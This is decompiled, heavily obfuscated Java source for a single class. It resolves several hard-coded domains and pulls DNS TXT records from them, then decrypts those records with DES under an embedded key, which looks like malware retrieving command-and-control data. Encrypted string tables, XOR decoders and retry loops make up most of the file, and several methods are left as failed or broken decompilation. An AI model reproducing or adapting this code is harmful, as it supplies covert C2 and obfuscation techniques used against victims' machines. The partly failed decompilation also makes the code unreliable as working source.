/*
 * Decompiled with CFR 0.152.
 */
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.security.Key;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Hashtable;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.naming.NameNotFoundException;
import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.InitialDirContext;

/*
 * Renamed from oB
 */
public class ob_1 {
    String k = null;
    boolean I = true;
    private static final String[] a;
    private static final String[] b;
    private static final long[] c;
    private static final Integer[] d;
    private static final long[] e;
    private static final Long[] f;

    public static void p(String[] stringArray) throws NamingException {
        ob_1 ob_12 = new ob_1();
        String string = ob_12.q();
    }

    public String q() {
        return "haokuai100.com";
    }

    /*
     * Exception decompiling
     */
    public String T() {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [6[DOLOOP]], but top level block is 1[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    static boolean S() {
        boolean bl = false;
        try {
            InetAddress inetAddress = InetAddress.getByName("avalble.haokuai100.info");
        }
        catch (UnknownHostException unknownHostException) {
            unknownHostException.printStackTrace();
        }
        return bl;
    }

    /*
     * Unable to fully structure code
     */
    static String w() {
        block29: {
            block30: {
                var1 = null;
                var0_1 = QI.N();
                var2_2 = "t1.dtbz8.com";
                var3_3 = 0;
                while (var3_3 < 1) {
                    try {
                        block27: {
                            block28: {
                                var4_6 = ob_1.X(var2_2);
                                var5_12 = ob_1.e(var4_6, "S268380y7c19529440435hgb");
                                try {
                                    v0 = var5_12 != null;
                                }
                                catch (NameNotFoundException v1) {
                                    throw ob_1.a(v1);
                                }
                                try {
                                    v2 = var5_12.equals("");
                                    if (var0_1 == null) break block27;
                                    if (!v2) break block28;
                                }
                                catch (NameNotFoundException v3) {
                                    throw ob_1.a(v3);
                                }
                                v2 = false;
                                break block27;
                            }
                            v2 = true;
                        }
                        if (!(v0 & v2)) break;
                        var1 = var5_12;
                        break;
                    }
                    catch (NameNotFoundException var4_7) {
                        var4_7.printStackTrace();
                        break;
                    }
                    catch (NamingException var4_5) {
                        var4_5.printStackTrace();
                        try {
                            Thread.sleep(ob_1.b(30367, 9067086024916269814L));
                        }
                        catch (InterruptedException var5_11) {}
                    }
                    catch (IOException var4_8) {
                        break;
                    }
                    catch (Exception var4_9) {
                        break;
                    }
                    ++var3_3;
                }
                var3_4 = "wt.cddf3455r3e3.in";
                try {
                    v4 = var1;
                    if (var0_1 == null) break block29;
                    if (v4 != null) break block30;
                }
                catch (NameNotFoundException v5) {
                    throw ob_1.a(v5);
                }
                var4_10 = 0;
                if (var0_1 != null) ** GOTO lbl91
                do {
                    try {
                        block31: {
                            block32: {
                                var5_12 = ob_1.X(var3_4);
                                var6_17 = ob_1.e(var5_12, "S268380y7c19529440435hgb");
                                v6 = var6_17 != null;
                                try {
                                    v7 = var6_17.equals("");
                                    if (var0_1 == null) break block31;
                                    if (!v7) break block32;
                                }
                                catch (NameNotFoundException v8) {
                                    throw ob_1.a(v8);
                                }
                                v7 = false;
                                break block31;
                            }
                            v7 = true;
                        }
                        if (v6 & v7) {
                            var1 = var6_17;
                        }
                        ** GOTO lbl87
                    }
                    catch (NameNotFoundException var5_13) {
                        break;
                    }
                    catch (NamingException var5_14) {
                        try {
                            Thread.sleep(ob_1.b(8421, 196259477868850317L));
                        }
                        catch (InterruptedException var6_18) {}
                        ** GOTO lbl87
                    }
                    catch (IOException var5_15) {
                        break;
                    }
                    catch (Exception var5_16) {
                        try {
                            if (var0_1 != null) break;
lbl87:
                            // 4 sources

                            ++var4_10;
                        }
                        catch (NameNotFoundException v9) {
                            throw ob_1.a(v9);
                        }
                    }
lbl91:
                    // 2 sources

                } while (var4_10 < true);
            }
            v4 = var1;
        }
        return v4;
    }

    public static String e(String string, String string2) throws IOException, Exception {
        try {
            if (string == null) {
                return null;
            }
        }
        catch (IOException iOException) {
            throw ob_1.a(iOException);
        }
        byte[] byArray = Base64.getDecoder().decode(string);
        byte[] byArray2 = ob_1.l(byArray, string2.getBytes());
        return new String(byArray2);
    }

    public static byte[] l(byte[] byArray, byte[] byArray2) throws Exception {
        SecureRandom secureRandom = new SecureRandom();
        DESKeySpec dESKeySpec = new DESKeySpec(byArray2);
        SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, (Key)secretKey, secureRandom);
        return cipher.doFinal(byArray);
    }

    public static String X(String string) throws NamingException {
        String string2;
        block5: {
            Object object;
            block4: {
                Hashtable<String, String> hashtable = new Hashtable<String, String>();
                hashtable.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
                InitialDirContext initialDirContext = new InitialDirContext(hashtable);
                Attributes attributes = initialDirContext.getAttributes(string, new String[]{"TXT"});
                String[] stringArray = QI.N();
                Attribute attribute = attributes.get("TXT");
                string2 = "";
                try {
                    try {
                        object = attribute;
                        if (stringArray == null) break block4;
                        if (object == null) break block5;
                    }
                    catch (NamingException namingException) {
                        throw ob_1.a(namingException);
                    }
                    object = attribute.get();
                }
                catch (NamingException namingException) {
                    throw ob_1.a(namingException);
                }
            }
            string2 = object.toString();
        }
        return string2;
    }

    public void H(String string) {
        this.k = string;
    }

    private static Exception a(Exception exception) {
        return exception;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block28: {
            block27: {
                block26: {
                    block25: {
                        block24: {
                            block23: {
                                var21 = new String[16];
                                var19_1 = 0;
                                var18_2 = "\u00beN&\u00cb>\u008b X4\u00d7\u00ba\u00a2Fc\u0003\u00a0]p\u0018\u00a3\u00a3\u0080\u001c\u00de\u0011\u00eb18\u00e8\u00c3&\u00cf\u00bd\u0006\u00b3\u0011\u00d0\u00a9\u008a\u00e79L\u00db\u001b.*oMv\u001f\u0011xBZO\u00cb\u0091\u00a6\u00ae\u00a9N\u0099?\u00b4\u008dF\u00d8\u00e4\u0012\n\u00ff\u0003\u00a8\u00dfd\f\u00a2\u00e7{\u00ab\u00fdjj\u000e\u0012f\u00e2\u00a3\u000f(M\u00f4\u00abd\u0087k\u00d9]\u00e7\u0097\u00ae\u00e2\u00a2\u00c5\u0003.\u0093\u00a1\u0018Q*\u00de-\u00157\u0092\u00f5\u0017p&5s\u00df\u0091\u00ff\u00e3Y\u00f7\u00bb,\u001f5\u001f\"k\u00c6\u00f4P \u0001\"\u0080\u00c9n^\n\u00984\u00c3Y\u000eVI\u00e0\u009c;\u0092j\u00b0\u00c2><\t.\u00e3\u0081\u00f9^\u0003U\u00d5\u00db\u0005\u008b\u00a9\u000f3 \u0017}\u001bx\u0093-j\u00bb\u00d7\u0092\u008b|Z\u00edyZ\u0017\u00c4\u00e1\u008d\u00f6a\u00a9\u00a4\u000e\u00d6\u0096+\u00d0\u009f\u00e8\u00144\u00b2Zj\u0013\\U";
                                var20_3 = "\u00beN&\u00cb>\u008b X4\u00d7\u00ba\u00a2Fc\u0003\u00a0]p\u0018\u00a3\u00a3\u0080\u001c\u00de\u0011\u00eb18\u00e8\u00c3&\u00cf\u00bd\u0006\u00b3\u0011\u00d0\u00a9\u008a\u00e79L\u00db\u001b.*oMv\u001f\u0011xBZO\u00cb\u0091\u00a6\u00ae\u00a9N\u0099?\u00b4\u008dF\u00d8\u00e4\u0012\n\u00ff\u0003\u00a8\u00dfd\f\u00a2\u00e7{\u00ab\u00fdjj\u000e\u0012f\u00e2\u00a3\u000f(M\u00f4\u00abd\u0087k\u00d9]\u00e7\u0097\u00ae\u00e2\u00a2\u00c5\u0003.\u0093\u00a1\u0018Q*\u00de-\u00157\u0092\u00f5\u0017p&5s\u00df\u0091\u00ff\u00e3Y\u00f7\u00bb,\u001f5\u001f\"k\u00c6\u00f4P \u0001\"\u0080\u00c9n^\n\u00984\u00c3Y\u000eVI\u00e0\u009c;\u0092j\u00b0\u00c2><\t.\u00e3\u0081\u00f9^\u0003U\u00d5\u00db\u0005\u008b\u00a9\u000f3 \u0017}\u001bx\u0093-j\u00bb\u00d7\u0092\u008b|Z\u00edyZ\u0017\u00c4\u00e1\u008d\u00f6a\u00a9\u00a4\u000e\u00d6\u0096+\u00d0\u009f\u00e8\u00144\u00b2Zj\u0013\\U".length();
                                var17_4 = 14;
                                var16_5 = -1;
lbl7:
                                // 2 sources

                                while (true) {
                                    v0 = 111;
                                    v1 = ++var16_5;
                                    v2 = var18_2.substring(v1, v1 + var17_4);
                                    v3 = -1;
                                    break block23;
                                    break;
                                }
lbl13:
                                // 1 sources

                                while (true) {
                                    var21[var19_1++] = v4.intern();
                                    if ((var16_5 += var17_4) < var20_3) {
                                        var17_4 = var18_2.charAt(var16_5);
                                        ** continue;
                                    }
                                    var18_2 = "t}\u00c7\u0015\u00ba\u00e8\b\u0012U\u0094^\u0097\u00f1\u00b4]\u00a0\u00c97\"\u00b2\u00c9\u00e2\u00b2G)\u00f1";
                                    var20_3 = "t}\u00c7\u0015\u00ba\u00e8\b\u0012U\u0094^\u0097\u00f1\u00b4]\u00a0\u00c97\"\u00b2\u00c9\u00e2\u00b2G)\u00f1".length();
                                    var17_4 = 7;
                                    var16_5 = -1;
lbl22:
                                    // 2 sources

                                    while (true) {
                                        v0 = 25;
                                        v5 = ++var16_5;
                                        v2 = var18_2.substring(v5, v5 + var17_4);
                                        v3 = 0;
                                        break block23;
                                        break;
                                    }
                                    break;
                                }
lbl28:
                                // 1 sources

                                while (true) {
                                    var21[var19_1++] = v4.intern();
                                    if ((var16_5 += var17_4) < var20_3) {
                                        var17_4 = var18_2.charAt(var16_5);
                                        ** continue;
                                    }
                                    break block24;
                                    break;
                                }
                            }
                            v6 = v2.toCharArray();
                            v7 = v6.length;
                            var22_6 = 0;
                            v8 = v0;
                            v9 = v6;
                            v10 = v7;
                            if (v7 > 1) ** GOTO lbl85
                            do {
                                v11 = v8;
                                v9 = v9;
                                v12 = v9;
                                v13 = v8;
                                v14 = var22_6;
                                while (true) {
                                    switch (var22_6 % 7) {
                                        case 0: {
                                            v15 = 57;
                                            break;
                                        }
                                        case 1: {
                                            v15 = 45;
                                            break;
                                        }
                                        case 2: {
                                            v15 = 94;
                                            break;
                                        }
                                        case 3: {
                                            v15 = 3;
                                            break;
                                        }
                                        case 4: {
                                            v15 = 68;
                                            break;
                                        }
                                        case 5: {
                                            v15 = 119;
                                            break;
                                        }
                                        default: {
                                            v15 = 95;
                                        }
                                    }
                                    v12[v14] = (char)(v12[v14] ^ (v13 ^ v15));
                                    ++var22_6;
                                    v8 = v11;
                                    if (v11 != 0) break;
                                    v11 = v8;
                                    v9 = v9;
                                    v14 = v8;
                                    v12 = v9;
                                    v13 = v8;
                                }
lbl85:
                                // 2 sources

                                v16 = v9;
                                v10 = v10;
                            } while (v10 > var22_6);
                            v4 = new String(v16);
                            switch (v3) {
                                default: {
                                    ** continue;
                                }
                                ** case 0:
lbl95:
                                // 1 sources

                                ** continue;
                            }
                        }
                        ob_1.a = var21;
                        ob_1.b = new String[16];
                        var8_7 = 4030264419180945487L;
                        var14_8 = new long[2];
                        var11_9 = 0;
                        var12_10 = "\u0019$\u0091cf\u00ce-\u00dd\u00bd;\u00c9\u00d3\u00e0\u00f1n\u00f3";
                        var13_11 = "\u0019$\u0091cf\u00ce-\u00dd\u00bd;\u00c9\u00d3\u00e0\u00f1n\u00f3".length();
                        var10_12 = 0;
                        while (true) {
                            break block25;
                            break;
                        }
lbl107:
                        // 1 sources

                        while (true) {
                            var14_8[v17] = (((long)var15_13[0] & 255L) << 56 | ((long)var15_13[1] & 255L) << 48 | ((long)var15_13[2] & 255L) << 40 | ((long)var15_13[3] & 255L) << 32 | ((long)var15_13[4] & 255L) << 24 | ((long)var15_13[5] & 255L) << 16 | ((long)var15_13[6] & 255L) << 8 | (long)var15_13[7] & 255L) ^ var8_7;
                            if (var10_12 < var13_11) ** continue;
                            break block26;
                            break;
                        }
                    }
                    var15_13 = var12_10.substring(var10_12, var10_12 += 8).getBytes("ISO-8859-1");
                    v17 = var11_9++;
                    ** while (true)
                }
                ob_1.c = var14_8;
                ob_1.d = new Integer[2];
                var0_14 = 7941472620108685294L;
                var6_15 = new long[3];
                var3_16 = 0;
                var4_17 = "\u0013\u00e1\u0005\u00f6\u008c\u001bf\u00f0l\u008c\u0087\u00b1=<\u00b0\u008bO\u001b\u00ea\u000e\u00bb\u00ddm\u009c";
                var5_18 = "\u0013\u00e1\u0005\u00f6\u008c\u001bf\u00f0l\u008c\u0087\u00b1=<\u00b0\u008bO\u001b\u00ea\u000e\u00bb\u00ddm\u009c".length();
                var2_19 = 0;
                while (true) {
                    break block27;
                    break;
                }
lbl129:
                // 1 sources

                while (true) {
                    var6_15[v18] = (((long)var7_20[0] & 255L) << 56 | ((long)var7_20[1] & 255L) << 48 | ((long)var7_20[2] & 255L) << 40 | ((long)var7_20[3] & 255L) << 32 | ((long)var7_20[4] & 255L) << 24 | ((long)var7_20[5] & 255L) << 16 | ((long)var7_20[6] & 255L) << 8 | (long)var7_20[7] & 255L) ^ var0_14;
                    if (var2_19 < var5_18) ** continue;
                    break block28;
                    break;
                }
            }
            var7_20 = var4_17.substring(var2_19, var2_19 += 8).getBytes("ISO-8859-1");
            v18 = var3_16++;
            ** while (true)
        }
        ob_1.e = var6_15;
        ob_1.f = new Long[3];
    }

    private static String a(int n10, int n11) {
        int n12 = (n10 ^ 0x468) & 0xFFFF;
        if (b[n12] == null) {
            int n13;
            int n14;
            char[] cArray = a[n12].toCharArray();
            switch (cArray[0] & 0xFF) {
                case 0: {
                    n14 = 56;
                    break;
                }
                case 1: {
                    n14 = 242;
                    break;
                }
                case 2: {
                    n14 = 85;
                    break;
                }
                case 3: {
                    n14 = 47;
                    break;
                }
                case 4: {
                    n14 = 104;
                    break;
                }
                case 5: {
                    n14 = 188;
                    break;
                }
                case 6: {
                    n14 = 25;
                    break;
                }
                case 7: {
                    n14 = 59;
                    break;
                }
                case 8: {
                    n14 = 166;
                    break;
                }
                case 9: {
                    n14 = 120;
                    break;
                }
                case 10: {
                    n14 = 112;
                    break;
                }
                case 11: {
                    n14 = 211;
                    break;
                }
                case 12: {
                    n14 = 240;
                    break;
                }
                case 13: {
                    n14 = 145;
                    break;
                }
                case 14: {
                    n14 = 121;
                    break;
                }
                case 15: {
                    n14 = 160;
                    break;
                }
                case 16: {
                    n14 = 176;
                    break;
                }
                case 17: {
                    n14 = 219;
                    break;
                }
                case 18: {
                    n14 = 27;
                    break;
                }
                case 19: {
                    n14 = 88;
                    break;
                }
                case 20: {
                    n14 = 138;
                    break;
                }
                case 21: {
                    n14 = 90;
                    break;
                }
                case 22: {
                    n14 = 163;
                    break;
                }
                case 23: {
                    n14 = 185;
                    break;
                }
                case 24: {
                    n14 = 201;
                    break;
                }
                case 25: {
                    n14 = 48;
                    break;
                }
                case 26: {
                    n14 = 30;
                    break;
                }
                case 27: {
                    n14 = 68;
                    break;
                }
                case 28: {
                    n14 = 152;
                    break;
                }
                case 29: {
                    n14 = 128;
                    break;
                }
                case 30: {
                    n14 = 19;
                    break;
                }
                case 31: {
                    n14 = 189;
                    break;
                }
                case 32: {
                    n14 = 49;
                    break;
                }
                case 33: {
                    n14 = 218;
                    break;
                }
                case 34: {
                    n14 = 97;
                    break;
                }
                case 35: {
                    n14 = 102;
                    break;
                }
                case 36: {
                    n14 = 200;
                    break;
                }
                case 37: {
                    n14 = 33;
                    break;
                }
                case 38: {
                    n14 = 65;
                    break;
                }
                case 39: {
                    n14 = 187;
                    break;
                }
                case 40: {
                    n14 = 34;
                    break;
                }
                case 41: {
                    n14 = 143;
                    break;
                }
                case 42: {
                    n14 = 20;
                    break;
                }
                case 43: {
                    n14 = 248;
                    break;
                }
                case 44: {
                    n14 = 192;
                    break;
                }
                case 45: {
                    n14 = 82;
                    break;
                }
                case 46: {
                    n14 = 100;
                    break;
                }
                case 47: {
                    n14 = 139;
                    break;
                }
                case 48: {
                    n14 = 224;
                    break;
                }
                case 49: {
                    n14 = 93;
                    break;
                }
                case 50: {
                    n14 = 215;
                    break;
                }
                case 51: {
                    n14 = 155;
                    break;
                }
                case 52: {
                    n14 = 150;
                    break;
                }
                case 53: {
                    n14 = 246;
                    break;
                }
                case 54: {
                    n14 = 3;
                    break;
                }
                case 55: {
                    n14 = 117;
                    break;
                }
                case 56: {
                    n14 = 233;
                    break;
                }
                case 57: {
                    n14 = 130;
                    break;
                }
                case 58: {
                    n14 = 179;
                    break;
                }
                case 59: {
                    n14 = 61;
                    break;
                }
                case 60: {
                    n14 = 9;
                    break;
                }
                case 61: {
                    n14 = 214;
                    break;
                }
                case 62: {
                    n14 = 254;
                    break;
                }
                case 63: {
                    n14 = 244;
                    break;
                }
                case 64: {
                    n14 = 136;
                    break;
                }
                case 65: {
                    n14 = 73;
                    break;
                }
                case 66: {
                    n14 = 8;
                    break;
                }
                case 67: {
                    n14 = 157;
                    break;
                }
                case 68: {
                    n14 = 2;
                    break;
                }
                case 69: {
                    n14 = 255;
                    break;
                }
                case 70: {
                    n14 = 84;
                    break;
                }
                case 71: {
                    n14 = 133;
                    break;
                }
                case 72: {
                    n14 = 147;
                    break;
                }
                case 73: {
                    n14 = 238;
                    break;
                }
                case 74: {
                    n14 = 230;
                    break;
                }
                case 75: {
                    n14 = 158;
                    break;
                }
                case 76: {
                    n14 = 21;
                    break;
                }
                case 77: {
                    n14 = 223;
                    break;
                }
                case 78: {
                    n14 = 182;
                    break;
                }
                case 79: {
                    n14 = 149;
                    break;
                }
                case 80: {
                    n14 = 205;
                    break;
                }
                case 81: {
                    n14 = 132;
                    break;
                }
                case 82: {
                    n14 = 39;
                    break;
                }
                case 83: {
                    n14 = 79;
                    break;
                }
                case 84: {
                    n14 = 202;
                    break;
                }
                case 85: {
                    n14 = 135;
                    break;
                }
                case 86: {
                    n14 = 77;
                    break;
                }
                case 87: {
                    n14 = 98;
                    break;
                }
                case 88: {
                    n14 = 184;
                    break;
                }
                case 89: {
                    n14 = 235;
                    break;
                }
                case 90: {
                    n14 = 118;
                    break;
                }
                case 91: {
                    n14 = 170;
                    break;
                }
                case 92: {
                    n14 = 137;
                    break;
                }
                case 93: {
                    n14 = 116;
                    break;
                }
                case 94: {
                    n14 = 156;
                    break;
                }
                case 95: {
                    n14 = 131;
                    break;
                }
                case 96: {
                    n14 = 109;
                    break;
                }
                case 97: {
                    n14 = 26;
                    break;
                }
                case 98: {
                    n14 = 226;
                    break;
                }
                case 99: {
                    n14 = 199;
                    break;
                }
                case 100: {
                    n14 = 106;
                    break;
                }
                case 101: {
                    n14 = 225;
                    break;
                }
                case 102: {
                    n14 = 207;
                    break;
                }
                case 103: {
                    n14 = 0;
                    break;
                }
                case 104: {
                    n14 = 86;
                    break;
                }
                case 105: {
                    n14 = 247;
                    break;
                }
                case 106: {
                    n14 = 14;
                    break;
                }
                case 107: {
                    n14 = 114;
                    break;
                }
                case 108: {
                    n14 = 53;
                    break;
                }
                case 109: {
                    n14 = 134;
                    break;
                }
                case 110: {
                    n14 = 10;
                    break;
                }
                case 111: {
                    n14 = 141;
                    break;
                }
                case 112: {
                    n14 = 37;
                    break;
                }
                case 113: {
                    n14 = 36;
                    break;
                }
                case 114: {
                    n14 = 24;
                    break;
                }
                case 115: {
                    n14 = 167;
                    break;
                }
                case 116: {
                    n14 = 23;
                    break;
                }
                case 117: {
                    n14 = 69;
                    break;
                }
                case 118: {
                    n14 = 173;
                    break;
                }
                case 119: {
                    n14 = 177;
                    break;
                }
                case 120: {
                    n14 = 195;
                    break;
                }
                case 121: {
                    n14 = 148;
                    break;
                }
                case 122: {
                    n14 = 57;
                    break;
                }
                case 123: {
                    n14 = 70;
                    break;
                }
                case 124: {
                    n14 = 110;
                    break;
                }
                case 125: {
                    n14 = 210;
                    break;
                }
                case 126: {
                    n14 = 31;
                    break;
                }
                case 127: {
                    n14 = 146;
                    break;
                }
                case 128: {
                    n14 = 101;
                    break;
                }
                case 129: {
                    n14 = 165;
                    break;
                }
                case 130: {
                    n14 = 58;
                    break;
                }
                case 131: {
                    n14 = 4;
                    break;
                }
                case 132: {
                    n14 = 51;
                    break;
                }
                case 133: {
                    n14 = 161;
                    break;
                }
                case 134: {
                    n14 = 213;
                    break;
                }
                case 135: {
                    n14 = 204;
                    break;
                }
                case 136: {
                    n14 = 216;
                    break;
                }
                case 137: {
                    n14 = 103;
                    break;
                }
                case 138: {
                    n14 = 41;
                    break;
                }
                case 139: {
                    n14 = 208;
                    break;
                }
                case 140: {
                    n14 = 151;
                    break;
                }
                case 141: {
                    n14 = 196;
                    break;
                }
                case 142: {
                    n14 = 162;
                    break;
                }
                case 143: {
                    n14 = 54;
                    break;
                }
                case 144: {
                    n14 = 231;
                    break;
                }
                case 145: {
                    n14 = 221;
                    break;
                }
                case 146: {
                    n14 = 171;
                    break;
                }
                case 147: {
                    n14 = 124;
                    break;
                }
                case 148: {
                    n14 = 44;
                    break;
                }
                case 149: {
                    n14 = 62;
                    break;
                }
                case 150: {
                    n14 = 249;
                    break;
                }
                case 151: {
                    n14 = 60;
                    break;
                }
                case 152: {
                    n14 = 174;
                    break;
                }
                case 153: {
                    n14 = 28;
                    break;
                }
                case 154: {
                    n14 = 154;
                    break;
                }
                case 155: {
                    n14 = 123;
                    break;
                }
                case 156: {
                    n14 = 99;
                    break;
                }
                case 157: {
                    n14 = 250;
                    break;
                }
                case 158: {
                    n14 = 72;
                    break;
                }
                case 159: {
                    n14 = 66;
                    break;
                }
                case 160: {
                    n14 = 168;
                    break;
                }
                case 161: {
                    n14 = 92;
                    break;
                }
                case 162: {
                    n14 = 81;
                    break;
                }
                case 163: {
                    n14 = 243;
                    break;
                }
                case 164: {
                    n14 = 212;
                    break;
                }
                case 165: {
                    n14 = 220;
                    break;
                }
                case 166: {
                    n14 = 142;
                    break;
                }
                case 167: {
                    n14 = 74;
                    break;
                }
                case 168: {
                    n14 = 126;
                    break;
                }
                case 169: {
                    n14 = 191;
                    break;
                }
                case 170: {
                    n14 = 178;
                    break;
                }
                case 171: {
                    n14 = 15;
                    break;
                }
                case 172: {
                    n14 = 13;
                    break;
                }
                case 173: {
                    n14 = 194;
                    break;
                }
                case 174: {
                    n14 = 16;
                    break;
                }
                case 175: {
                    n14 = 105;
                    break;
                }
                case 176: {
                    n14 = 55;
                    break;
                }
                case 177: {
                    n14 = 203;
                    break;
                }
                case 178: {
                    n14 = 197;
                    break;
                }
                case 179: {
                    n14 = 17;
                    break;
                }
                case 180: {
                    n14 = 236;
                    break;
                }
                case 181: {
                    n14 = 43;
                    break;
                }
                case 182: {
                    n14 = 115;
                    break;
                }
                case 183: {
                    n14 = 38;
                    break;
                }
                case 184: {
                    n14 = 193;
                    break;
                }
                case 185: {
                    n14 = 29;
                    break;
                }
                case 186: {
                    n14 = 67;
                    break;
                }
                case 187: {
                    n14 = 45;
                    break;
                }
                case 188: {
                    n14 = 159;
                    break;
                }
                case 189: {
                    n14 = 42;
                    break;
                }
                case 190: {
                    n14 = 175;
                    break;
                }
                case 191: {
                    n14 = 78;
                    break;
                }
                case 192: {
                    n14 = 18;
                    break;
                }
                case 193: {
                    n14 = 22;
                    break;
                }
                case 194: {
                    n14 = 46;
                    break;
                }
                case 195: {
                    n14 = 169;
                    break;
                }
                case 196: {
                    n14 = 186;
                    break;
                }
                case 197: {
                    n14 = 7;
                    break;
                }
                case 198: {
                    n14 = 95;
                    break;
                }
                case 199: {
                    n14 = 52;
                    break;
                }
                case 200: {
                    n14 = 241;
                    break;
                }
                case 201: {
                    n14 = 127;
                    break;
                }
                case 202: {
                    n14 = 183;
                    break;
                }
                case 203: {
                    n14 = 153;
                    break;
                }
                case 204: {
                    n14 = 252;
                    break;
                }
                case 205: {
                    n14 = 40;
                    break;
                }
                case 206: {
                    n14 = 87;
                    break;
                }
                case 207: {
                    n14 = 129;
                    break;
                }
                case 208: {
                    n14 = 80;
                    break;
                }
                case 209: {
                    n14 = 245;
                    break;
                }
                case 210: {
                    n14 = 64;
                    break;
                }
                case 211: {
                    n14 = 35;
                    break;
                }
                case 212: {
                    n14 = 239;
                    break;
                }
                case 213: {
                    n14 = 234;
                    break;
                }
                case 214: {
                    n14 = 107;
                    break;
                }
                case 215: {
                    n14 = 91;
                    break;
                }
                case 216: {
                    n14 = 227;
                    break;
                }
                case 217: {
                    n14 = 50;
                    break;
                }
                case 218: {
                    n14 = 122;
                    break;
                }
                case 219: {
                    n14 = 96;
                    break;
                }
                case 220: {
                    n14 = 11;
                    break;
                }
                case 221: {
                    n14 = 113;
                    break;
                }
                case 222: {
                    n14 = 119;
                    break;
                }
                case 223: {
                    n14 = 237;
                    break;
                }
                case 224: {
                    n14 = 6;
                    break;
                }
                case 225: {
                    n14 = 172;
                    break;
                }
                case 226: {
                    n14 = 181;
                    break;
                }
                case 227: {
                    n14 = 108;
                    break;
                }
                case 228: {
                    n14 = 71;
                    break;
                }
                case 229: {
                    n14 = 1;
                    break;
                }
                case 230: {
                    n14 = 209;
                    break;
                }
                case 231: {
                    n14 = 180;
                    break;
                }
                case 232: {
                    n14 = 190;
                    break;
                }
                case 233: {
                    n14 = 232;
                    break;
                }
                case 234: {
                    n14 = 75;
                    break;
                }
                case 235: {
                    n14 = 5;
                    break;
                }
                case 236: {
                    n14 = 206;
                    break;
                }
                case 237: {
                    n14 = 12;
                    break;
                }
                case 238: {
                    n14 = 76;
                    break;
                }
                case 239: {
                    n14 = 111;
                    break;
                }
                case 240: {
                    n14 = 140;
                    break;
                }
                case 241: {
                    n14 = 217;
                    break;
                }
                case 242: {
                    n14 = 32;
                    break;
                }
                case 243: {
                    n14 = 164;
                    break;
                }
                case 244: {
                    n14 = 89;
                    break;
                }
                case 245: {
                    n14 = 228;
                    break;
                }
                case 246: {
                    n14 = 63;
                    break;
                }
                case 247: {
                    n14 = 251;
                    break;
                }
                case 248: {
                    n14 = 125;
                    break;
                }
                case 249: {
                    n14 = 222;
                    break;
                }
                case 250: {
                    n14 = 94;
                    break;
                }
                case 251: {
                    n14 = 144;
                    break;
                }
                case 252: {
                    n14 = 229;
                    break;
                }
                case 253: {
                    n14 = 253;
                    break;
                }
                case 254: {
                    n14 = 198;
                    break;
                }
                default: {
                    n14 = 83;
                }
            }
            int n15 = n14;
            int n16 = (n11 & 0xFF) - n15;
            if (n16 < 0) {
                n16 += 256;
            }
            if ((n13 = ((n11 & 0xFFFF) >>> 8) - n15) < 0) {
                n13 += 256;
            }
            int n17 = 0;
            while (n17 < cArray.length) {
                int n18 = n17 % 2;
                int n19 = n17;
                char[] cArray2 = cArray;
                char c2 = cArray[n19];
                if (n18 == 0) {
                    cArray2[n19] = (char)(c2 ^ n16);
                    n16 = ((n16 >>> 3 | n16 << 5) ^ cArray[n17]) & 0xFF;
                } else {
                    cArray2[n19] = (char)(c2 ^ n13);
                    n13 = ((n13 >>> 3 | n13 << 5) ^ cArray[n17]) & 0xFF;
                }
                ++n17;
            }
            ob_1.b[n12] = new String(cArray).intern();
        }
        return b[n12];
    }

    private static int a(int n10, long l2) {
        int n11 = n10 ^ (int)(l2 & 0x7FFFL) ^ 0x7134;
        if (d[n11] == null) {
            ob_1.d[n11] = (int)(c[n11] ^ l2);
        }
        return d[n11];
    }

    private static long b(int n10, long l2) {
        int n11 = (n10 ^ (int)l2 ^ 0xC69) & Short.MAX_VALUE;
        if (f[n11] == null) {
            ob_1.f[n11] = e[n11] ^ l2;
        }
        return f[n11];
    }
}

